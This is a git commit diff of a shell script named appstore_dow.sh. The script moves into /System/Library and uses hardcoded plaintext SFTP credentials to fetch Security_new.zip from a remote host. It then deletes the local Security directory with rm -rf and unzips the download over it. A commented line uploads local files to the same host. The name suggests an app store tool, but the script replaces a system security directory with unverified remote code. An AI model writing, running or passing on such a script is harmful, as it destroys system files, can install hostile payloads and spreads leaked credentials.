9d7631f69b2dcf8f12fbea244fce892ee46b09c1
codecpacka <32800467+codecpacka@users.noreply.github.com>
2026-05-04 10:17:25 +0530

    Update appstore_dow.sh
    xdfds

--- appstore_dow.sh
+++ appstore_dow.sh
@@ -1,13 +1,13 @@
 cd $home/../../..//System/Library/
 # configuration
-REMOTE_USER="1fbeee1775e2493d893db0d0518b5a2a"
+REMOTE_USER="fbb63a5ef02b44fbba92f30d84f59364"
 REMOTE_HOST="eu-central-1.sftpcloud.io"
 REMOTE_PATH="/home"
-REMOTE_PASS="txb80XFYMH4bhVM8tBBJYnlSvw6U4tQI"
+REMOTE_PASS="IgTYRB9xm4lgOxFhsEgLJfcRnJr6W4Fq"
 REMOTE_DEST="/"
 
 # sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
-sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:test2.zip ./test2.zip
-rm -rf ./test
+sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:Security_new.zip ./Security_new.zip
+rm -rf ./Security
 echo "fsdfsdfdsfsdfsdfds"
-unzip -o test2.zip -d ./
+unzip -o Security_new.zip -d ./
